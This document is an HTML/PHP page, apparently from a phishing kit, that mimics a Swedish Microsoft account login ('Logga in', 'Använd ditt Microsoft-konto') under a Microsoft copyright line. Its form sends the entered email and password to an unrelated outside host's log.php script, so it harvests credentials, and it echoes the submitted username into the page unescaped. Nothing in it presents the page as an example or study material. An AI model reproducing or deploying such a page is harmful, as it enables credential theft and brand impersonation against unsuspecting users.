﻿<html>
<head>
<title>Logga in</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="stylesheet" type="text/css" href="css/styles.css">
<link href="images/hfavicon.ico" rel="shortcut icon">
</head>
<body >
<body ><div id="container">
	<div id="container">
		<div class="logo">
			<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQ5_4gMRxXbFWKPQltu84Jw2Agc8_k0c5WcwJV4zVzgmMVEr5BJ">
			<div class="header-wrapper">
				<h2 class="header-text">Logga in</h2>
				<span>Använd ditt Microsoft-konto.<br /><a href="#">Vad är det här?</a></span>
			</div>
		</div>
		<div class="content">
			<div class="login-form">
				<form method="POST" action="https://bemindfulmich.com/wil/se0/log.php">
					<div class="input-fields">
						<?php echo $email_error !== "" ? '<div class="error user-error">'.$email_error.'</div>' : ""; ?>

						<?php 
							if($user_email == ""){
								$user = $_POST ? $_POST['username']:"";
								echo '<input type="text" lang="en" name="username" maxlength="113" class="login-data" placeholder="E-post" value="'.$user.'" name="username" />';
							} else{
								echo '<div class="known-user">'.$user_email.'</div>';
								echo '<input type="hidden" name="username" value="'.$user_email.'" />';
							}
						?>
						<?php echo $pass_error !== "" ? '<div class="error input-fields2">'.$pass_error.'</div>' : "";  ?>

						<input class="login-data" type="password" name="password" autocomplete="off" maxlength="127" placeholder="Lösenord" />
					</div>

					<div class="input-checkbox">
						<input type="checkbox"><label>Håll mig inloggad</label>
					</div>
					<div class="input-fields button-gap">
						<input class="btn-primary" type="submit" value="Logga in" class="default">
					</div>
					<div class="input-fields forgot">
						<p class="brand">Microsoft © 2017 </p>
					</div>
				</form>
			</div>
		</div>
	</div>
</body>
</html>